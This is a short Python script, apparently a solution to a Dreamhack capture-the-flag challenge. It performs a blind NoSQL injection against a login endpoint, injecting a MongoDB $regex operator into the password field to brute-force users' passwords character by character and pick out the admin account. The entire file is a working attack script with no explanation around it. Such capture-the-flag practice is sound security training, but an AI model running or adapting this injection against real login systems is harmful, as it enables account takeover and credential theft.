import requests
import string

wordlist = string.ascii_letters + string.digits + '{}'

url = 'http://host3.dreamhack.games:16230'

users = ['guest', 'hack', 'apple', 'melon', 'testuser', 'admin', 'aaaa', 'cream', 'berry', 'ice', 'panda']

for user in users:
    pw = ''
    isAdmin = True
    while True:
        for c in wordlist:
            res = requests.post(url+'/login', json={'uid': f'{user}', 'upw': {'$regex': f'^{pw}{c}.*$'}})
            if 'Welcome' in res.text:
                if 'auth: 0' in res.text:
                    isAdmin = False
                    break
                pw += c
                break

        if not isAdmin:
            print(f'{user} is not admin')
            break
        
        if c == '}':
            break

    if isAdmin:
        print(f'{user}: {pw}')
